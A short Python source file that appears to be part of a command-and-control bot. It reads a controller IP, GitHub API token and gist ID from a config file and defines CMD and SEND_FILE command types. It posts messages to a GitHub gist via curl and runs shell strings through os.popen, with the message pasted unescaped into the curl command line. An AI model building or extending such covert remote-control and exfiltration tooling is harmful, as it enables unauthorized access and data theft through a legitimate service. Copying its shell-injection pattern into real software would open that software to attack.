import os
import re
import json
from enum import Enum

CONTROLLER_IP = ""
GIT_API_TOKEN = ""
GIST_ID = ""

class Command(Enum):
    NONE = 0
    CMD = 1
    SEND_FILE = 2


def init_config():
    file = open('config.json')
    config = json.load(file)

    global GIT_API_TOKEN, GIST_ID, CONTROLLER_IP
    GIT_API_TOKEN = config['GIT_API_TOKEN']
    GIST_ID = config['GIST_ID']
    CONTROLLER_IP = config['CONTROLLER_IP']


def curl_post_gist_comment(msg):
    cmd = "curl \
            -X POST \
            -H 'Accept: application/vnd.github+json' \
            -H 'Authorization: Bearer " + GIT_API_TOKEN + "' \
            -H 'X-GitHub-Api-Version: 2022-11-28' \
            https://api.github.com/gists/" + GIST_ID + "/comments \
            -d '{\"body\":\"" + msg + "\"}' \
        \n"
    cmd = re.sub(' +', ' ', cmd)
    response = perform_command(cmd)
    return response


def perform_command(cmd):
    stream = os.popen(cmd)
    out = stream.read()
    return out
